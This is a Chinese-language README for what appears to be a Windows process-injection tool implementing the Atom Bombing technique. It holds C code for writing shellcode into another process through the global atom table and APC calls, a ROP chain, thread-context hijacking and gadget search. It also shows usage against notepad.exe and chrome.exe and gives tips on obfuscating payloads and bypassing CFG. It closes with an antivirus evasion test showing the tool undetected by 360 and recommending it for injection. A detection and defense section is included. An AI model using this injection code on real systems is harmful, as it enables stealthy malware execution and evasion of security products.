# Atom Bombing - 全局 Atom 表代码注入

## 技术概述

Atom Bombing 是一种极其精巧的代码注入技术，由 enSilo（现为 Fortinet 一部分）的安全研究人员在 2016 年发现。该技术利用 Windows 全局 Atom 表和 APC（Asynchronous Procedure Call）机制，完全绕过传统的进程注入检测手段。

**核心创新：**
- ❌ 不使用 `VirtualAllocEx`
- ❌ 不使用 `WriteProcessMemory`
- ❌ 不使用 `CreateRemoteThread`
- ✅ 全部使用合法的 Windows API
- ✅ 利用系统设计特性而非漏洞

**MITRE ATT&CK:** T1055.003 - Process Injection: Thread Execution Hijacking

## 核心原理

### 技术架构

```
[攻击者进程]                    [目标进程]
      │                             │
      │  1. GlobalAddAtomW          │
      ├──────────────────> [全局 Atom 表]
      │                             │
      │  2. NtQueueApcThread         │
      │     (GlobalGetAtomNameW)     │
      ├─────────────────────────────>│
      │                             │
      │                    [APC 执行 GlobalGetAtomNameW]
      │                             │
      │                    [Atom 数据 → 目标进程内存]
      │                             │
      │  3. 构建 ROP 链并劫持线程    │
      ├─────────────────────────────>│
      │                             │
      │                    [执行 shellcode]
```

### 执行流程详解

#### 步骤 1: 利用 Atom 表传输数据

**Atom 表简介：**
- Windows 全局 Atom 表是一个系统级的字符串存储机制
- 所有进程都可以访问全局 Atom 表
- 原本用于进程间消息传递和共享字符串
- 每个 Atom 可以存储最多 255 个 WCHAR（510 字节）

**写入流程：**
```c
// 攻击者进程：添加 Atom
WCHAR buffer[256] = {/* shellcode 片段 */};
ATOM atom = GlobalAddAtomW(buffer);

// 目标进程：通过 APC 读取 Atom
NtQueueApcThread(
    hTargetThread,
    GlobalGetAtomNameW,     // APC 函数
    (PVOID)atom,            // 参数 1: atom ID
    (PVOID)remoteBuffer,    // 参数 2: 目标地址
    (PVOID)bufferSize       // 参数 3: 大小
);

// GlobalGetAtomNameW 在目标进程执行，将 atom 内容写入 remoteBuffer
```

**关键技巧：**
- `GlobalGetAtomNameW` 是合法的系统 API
- 通过 APC 在目标进程执行
- 实现了跨进程内存写入，但不使用 `WriteProcessMemory`

#### 步骤 2: 构建 ROP 链

由于目标进程的内存可能受到 DEP（Data Execution Prevention）保护，直接执行写入的 shellcode 会失败。因此需要构建 ROP（Return-Oriented Programming）链来：

1. **分配可执行内存**
   ```c
   // ROP 链第一步：调用 NtAllocateVirtualMemory
   NtAllocateVirtualMemory(
       GetCurrentProcess(),
       &baseAddress,        // 将被填充
       0,
       &regionSize,
       MEM_COMMIT,
       PAGE_EXECUTE_READWRITE
   );
   ```

2. **复制 shellcode**
   ```c
   // ROP 链第二步：调用 memcpy
   memcpy(
       allocatedMemory,     // 第一步分配的内存
       shellcodeAddress,
       shellcodeSize
   );
   ```

3. **执行 shellcode**
   ```c
   // ROP 链第三步：RET gadget 跳转到分配的内存
   // ret 指令会跳转到栈顶地址，即 allocatedMemory
   ```

**ROP 链结构：**
```c
typedef struct _ROP_CHAIN {
    // ===== NtAllocateVirtualMemory 参数 =====
    PVOID pvMemcpy;              // 返回地址（跳转到 memcpy）
    HANDLE hProcess;             // 进程句柄
    PVOID *pBaseAddress;         // 输出：分配的地址
    ULONG_PTR ZeroBits;
    PSIZE_T pRegionSize;
    ULONG AllocationType;
    ULONG Protect;

    // ===== memcpy 参数 =====
    PVOID pvRetGadget;           // 返回地址（RET gadget）
    PVOID Destination;           // 从 pBaseAddress 获取
    PVOID Source;                // shellcode 地址
    SIZE_T Length;               // shellcode 大小
} ROP_CHAIN;
```

#### 步骤 3: 劫持线程执行

**修改线程上下文：**
```c
// 1. 获取线程上下文
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_CONTROL;
GetThreadContext(hThread, &ctx);

// 2. 修改寄存器指向 ROP 链
ctx.Rip = NtAllocateVirtualMemory;  // x64
ctx.Rsp = ropChainAddress;          // 栈指针
ctx.Rbp = ropChainAddress;          // 基址指针

// 3. 通过 APC 设置新上下文
NtQueueApcThread(
    hThread,
    NtSetContextThread,
    GetCurrentThread(),
    &ctx,
    NULL
);

// 4. 恢复线程执行
ResumeThread(hThread);
```

**执行流程：**
```
线程恢复 → RIP = NtAllocateVirtualMemory
          ↓
     分配 RWX 内存
          ↓
     返回到 memcpy (栈上的返回地址)
          ↓
     复制 shellcode 到分配的内存
          ↓
     返回到 RET gadget
          ↓
     RET 跳转到分配的内存
          ↓
     执行 shellcode
```

### 代码洞（Code Cave）

为了存储 ROP 链和 shellcode，Atom Bombing 使用"代码洞"技术：

**查找代码洞：**
```c
// 在 kernelbase.dll 的 .data 节末尾
HMODULE hKernelBase = GetModuleHandleA("kernelbase.dll");
PIMAGE_SECTION_HEADER dataSection = FindSection(hKernelBase, ".data");
PVOID codeCave = (BYTE *)hKernelBase +
                 dataSection->VirtualAddress +
                 dataSection->SizeOfRawData;
```

**特点：**
- 已映射到所有进程的地址空间
- 通常有足够的空闲空间
- 对于大多数进程，地址相同

## 与其他技术的对比

| 特征 | Atom Bombing | Classic Injection | APC Injection |
|------|--------------|-------------------|---------------|
| **VirtualAllocEx** | ❌ 不使用 | ✅ 使用 | ✅ 使用 |
| **WriteProcessMemory** | ❌ 不使用 | ✅ 使用 | ✅ 使用 |
| **CreateRemoteThread** | ❌ 不使用 | ✅ 使用 | ❌ 不使用 |
| **数据传输方式** | Atom 表 + APC | WriteProcessMemory | WriteProcessMemory |
| **执行方式** | ROP + 线程劫持 | CreateRemoteThread | QueueUserAPC |
| **绕过检测** | 高 | 低 | 中 |
| **技术复杂度** | 极高 | 低 | 中 |
| **可靠性** | 中 | 高 | 中 |

## 优势与劣势

### ✅ 优势

1. **绕过传统检测**
   - 不触发对 `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` 的监控
   - 所有 API 调用都是合法的系统函数
   - 利用系统设计而非漏洞

2. **隐蔽性极高**
   - 使用全局 Atom 表传输数据（正常的系统机制）
   - APC 机制是 Windows 标准线程调度特性
   - ROP 链使用系统 DLL 中的代码

3. **无文件落地**
   - Shellcode 直接通过 Atom 表传输
   - 不需要创建临时文件
   - 内存操作痕迹小

4. **跨架构支持**
   - 可以适配 x86 和 x64
   - 原理在不同 Windows 版本通用

### ❌ 劣势

1. **实现复杂**
   - 需要构建正确的 ROP 链
   - 需要查找 RET gadget
   - 需要处理不同架构的差异

2. **可靠性受限**
   - 依赖代码洞的存在
   - ROP 链可能因 DLL 版本不同而失效
   - 需要目标线程处于可劫持状态

3. **Atom 表限制**
   - 每个 Atom 最多 255 WCHAR（510 字节）
   - 需要多次写入大型 shellcode
   - 性能开销较大

4. **检测难度降低**
   - 现代 EDR 已经可以检测异常的 Atom 操作
   - `GlobalGetAtomNameW` 通过 APC 调用是可疑行为
   - 线程上下文频繁修改会被标记

## 实现细节

### Atom 写入优化

```c
BOOL AtomWriteMemory(HANDLE hThread, PVOID remoteAddr, const void *data, SIZE_T size) {
    const BYTE *dataPtr = (const BYTE *)data;
    SIZE_T bytesWritten = 0;

    while (bytesWritten < size) {
        // 计算本次写入大小（最多 255 WCHAR）
        SIZE_T chunkSize = min(RTL_MAXIMUM_ATOM_LENGTH * sizeof(WCHAR),
                               size - bytesWritten);

        // 准备缓冲区
        WCHAR buffer[RTL_MAXIMUM_ATOM_LENGTH + 1] = {0};
        memcpy(buffer, dataPtr + bytesWritten, chunkSize);

        // 添加 Atom
        ATOM atom = GlobalAddAtomW(buffer);

        // 挂起线程
        SuspendThread(hThread);

        // 使用 APC 写入数据
        NtQueueApcThread(
            hThread,
            GlobalGetAtomNameW,
            (PVOID)(ULONG_PTR)atom,
            (PVOID)((BYTE *)remoteAddr + bytesWritten),
            (PVOID)(chunkSize + sizeof(WCHAR))
        );

        // 恢复线程执行 APC
        ResumeThread(hThread);
        Sleep(50);  // 等待 APC 执行

        // 删除 Atom
        GlobalDeleteAtom(atom);

        bytesWritten += chunkSize;
    }

    return TRUE;
}
```

### 查找 RET Gadget

```c
PVOID FindRetGadget() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_SECTION_HEADER textSection = FindSection(hNtdll, ".text");

    // 在 .text 节中查找 0xC3 (RET 指令)
    BYTE *start = (BYTE *)hNtdll + textSection->VirtualAddress;
    for (DWORD i = 0; i < textSection->SizeOfRawData; i++) {
        if (start[i] == 0xC3) {
            return (PVOID)(start + i);
        }
    }

    return NULL;
}
```

## 编译和使用

### 编译

**Windows (CMD):**
```batch
build.bat
```

**Linux/MSYS (Bash):**
```bash
chmod +x build.sh
./build.sh
```

### 使用方法

```bash
# 基本用法
build\atom_bombing.exe <进程名>

# 示例：注入到 notepad.exe
build\atom_bombing.exe notepad.exe

# 示例：注入到 chrome.exe
build\atom_bombing.exe chrome.exe
```

### 输出示例

```
========================================
  Atom Bombing
  全局 Atom 表代码注入
========================================

[*] 查找进程: notepad.exe
[+] 找到进程: PID = 1234

[*] 步骤 1: 打开目标进程 (PID: 1234)
[*] 步骤 2: 枚举进程线程
[+] 找到 3 个线程，选择第一个线程

[*] 步骤 3: 查找代码洞
[+] 代码洞地址: 0x00007FFD12340000

[*] 步骤 4: 构建 ROP 链
[*] 步骤 5: 使用 Atom 表写入 Shellcode
[*] 使用 Atom 表写入 193 字节到 0x00007FFD12340050
[+] 已写入 193/193 字节

[*] 步骤 6: 使用 Atom 表写入 ROP 链
[*] 使用 Atom 表写入 64 字节到 0x00007FFD12340000
[+] 已写入 64/64 字节

[*] 步骤 7: 劫持线程执行 ROP 链
[*] 原始 RIP: 0x00007FFD23456789
[*] 新 RIP: 0x00007FFD98765432 (NtAllocateVirtualMemory)
[*] 新 RSP: 0x00007FFD12340000 (ROP 链)

[+] Atom Bombing 注入成功！
[*] Shellcode 将在线程恢复后执行

[+] 完成！
```

## 检测与防御

### 🔍 检测方法

#### 1. Atom 表异常监控

**检测点：**
```c
// 监控大量 Atom 的快速创建和删除
for each GlobalAddAtomW() call:
    if (atoms_created_per_second > threshold):
        ALERT("可能的 Atom Bombing 攻击")

// 监控 Atom 内容
for each GlobalAddAtomW(buffer):
    if (contains_executable_code(buffer)):
        ALERT("Atom 包含可执行代码")
```

**特征：**
- 短时间内大量创建和删除 Atom
- Atom 内容包含二进制代码而非文本
- Atom 名称无意义或随机

#### 2. APC 异常分析

**可疑模式：**
```c
// 监控跨进程 APC 调用
if (ApcRoutine == GlobalGetAtomNameW &&
    SourceProcess != TargetProcess):
    ALERT("跨进程 GlobalGetAtomNameW APC")

// 监控 APC 目标地址
if (ApcRoutine == GlobalGetAtomNameW &&
    !IsModuleAddress(ApcArgument2)):
    ALERT("GlobalGetAtomNameW 写入非模块地址")
```

**特征：**
- `GlobalGetAtomNameW` 通过 APC 调用
- APC 目标地址不在合法模块范围
- 短时间内大量 APC 队列化

#### 3. 线程上下文修改

**检测逻辑：**
```c
// 监控 SetThreadContext 调用
on SetThreadContext(hThread, ctx):
    if (ctx.Rip points to non-module memory):
        ALERT("线程指向非模块内存")

    if (ctx.Rip == NtAllocateVirtualMemory &&
        ctx.Rsp points to code cave):
        ALERT("可能的 ROP 链执行")
```

#### 4. 内存扫描

**扫描策略：**
```c
// 扫描代码洞区域
for each process:
    codeCave = FindCodeCave(process, "kernelbase.dll")
    if (contains_shellcode(codeCave)):
        ALERT("代码洞包含 shellcode")

// 扫描 ROP 链特征
for each memory region:
    if (looks_like_rop_chain(region)):
        ALERT("检测到 ROP 链")
```

### 🛡️ 防御措施

#### 1. 进程级防护

**限制 Atom 操作：**
```c
// 禁用全局 Atom 表访问（如果不需要）
PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY policy = {0};
policy.DisallowWin32kSystemCalls = 1;
SetProcessMitigationPolicy(
    ProcessSystemCallDisablePolicy,
    &policy,
    sizeof(policy)
);
```

**启用 CFG (Control Flow Guard)：**
```c
PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY policy = {0};
policy.EnableControlFlowGuard = 1;
SetProcessMitigationPolicy(
    ProcessControlFlowGuardPolicy,
    &policy,
    sizeof(policy)
);
// CFG 可以检测异常的控制流跳转（如 ROP）
```

#### 2. EDR/XDR 规则

**Sysmon 配置：**
```xml
<RuleGroup name="AtomBombing">
  <!-- 监控大量 Atom 操作 -->
  <ProcessAccess onmatch="include">
    <GrantedAccess condition="is">0x1F0FFF</GrantedAccess>
  </ProcessAccess>

  <!-- 监控 APC 注入 -->
  <CreateRemoteThread onmatch="include">
    <StartModule condition="contains">GlobalGetAtomNameW</StartModule>
  </CreateRemoteThread>

  <!-- 监控线程上下文修改 -->
  <SetThreadContext onmatch="include">
    <TargetImage condition="end with">notepad.exe</TargetImage>
  </SetThreadContext>
</RuleGroup>
```

**Elastic 检测规则：**
```yaml
rule:
  name: "Atom Bombing Detection"
  query: |
    sequence by process.pid
      [process.thread.apc_routine: "GlobalGetAtomNameW"]
      [process.thread.context_modified: true]
    | where process.parent.name != "explorer.exe"
```

#### 3. 行为分析

**机器学习特征：**
```python
features = [
    'atom_creation_rate',          # Atom 创建速率
    'apc_queue_count',             # APC 队列数量
    'globalgetatomname_frequency', # GlobalGetAtomNameW 调用频率
    'context_modification_count',  # 上下文修改次数
    'rop_chain_probability'        # ROP 链概率
]

if ml_model.predict(features) > threshold:
    alert("Atom Bombing 攻击")
```

#### 4. 应用程序白名单

```c
// 只允许受信任的进程访问
if (is_trusted_process(pid)):
    allow_atom_operations()
else:
    if (atom_creation_count > 10):
        block_and_alert()
```

## 历史漏洞与补丁

### CVE 信息

虽然 Atom Bombing 本身不是 CVE（因为它利用的是系统设计而非漏洞），但相关的防御措施已经被集成到 Windows 安全更新中：

- **Windows 10 RS2+**: 加强了 Atom 表访问控制
- **Windows 10 RS3+**: CFG 改进，更好地检测 ROP 链
- **Windows Defender ATP**: 专门的 Atom Bombing 检测规则

### Microsoft 响应

Microsoft 的官方立场是：
> "Atom tables are designed as a shared resource, and the behavior described is by design. We recommend using modern security features like CFG, CIG (Code Integrity Guard), and ACG (Arbitrary Code Guard) to mitigate such attacks."

## 进阶技巧

### 1. 绕过 CFG

```c
// 使用合法的函数指针
// CFG 只检查间接调用，不检查直接调用
ctx.Rip = NtAllocateVirtualMemory;  // 直接地址，CFG 不检查
```

### 2. 混淆 Atom 内容

```c
// XOR 编码 Atom 内容
WCHAR buffer[256];
for (int i = 0; i < size; i++) {
    buffer[i] = shellcode[i] ^ 0xAA;
}
ATOM atom = GlobalAddAtomW(buffer);

// 目标进程解码
// 需要先注入解码 stub
```

### 3. 多线程注入

```c
// 向多个线程注入相同的 shellcode
// 提高成功率
for each thread in target_process:
    AtomBombingInject(thread, shellcode)
```

## 参考资料

### 技术文档
- [enSilo Original Research - Atom Bombing](https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows)
- [MITRE ATT&CK - T1055.003](https://attack.mitre.org/techniques/T1055/003/)
- [Microsoft - Atom Tables](https://docs.microsoft.com/en-us/windows/win32/dataxchg/about-atom-tables)
- [Windows Internals - APC](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls)

### 开源项目
- [BreakingMalwareResearch/atom-bombing](https://github.com/BreakingMalwareResearch/atom-bombing) - 原始实现
- [Injection Techniques Collection](https://github.com/elastic/detection-rules) - Elastic 检测规则

### 学术论文
- "Atom Bombing: A Code Injection that Bypasses Current Security Solutions" - enSilo Research Team
- "Return-Oriented Programming: Systems, Languages, and Applications" - Hovav Shacham et al.

### 相关技术
- [Thread Hijacking](../19-thread-hijacking) - 线程劫持
- [APC Queue Injection](../18-apc-queue-injection) - APC 队列注入
- [Process Doppelgänging](../03-process-doppelganging) - 进程变脸

## 许可证

本项目仅供教育和研究目的使用。请勿用于非法活动。

---

**免责声明：** Atom Bombing 是一种高级攻击技术，本实现仅用于安全研究和教育目的。使用者需遵守当地法律法规，不得将此技术用于未经授权的系统。作者不对任何滥用行为负责。

## 杀软测试

### 360安全卫士 13.0.10.2001（核晶模式）

**测试时间:** 2025-11

**测试结果:** ✅ **未检出** - 完美执行

**观察:**
- Atom Bombing利用全局原子表绕过360监控
- GlobalGetAtomName调用未被视为可疑

**建议:**
- 可作为特殊场景下的注入技术
- 注意atom大小限制（64KB）

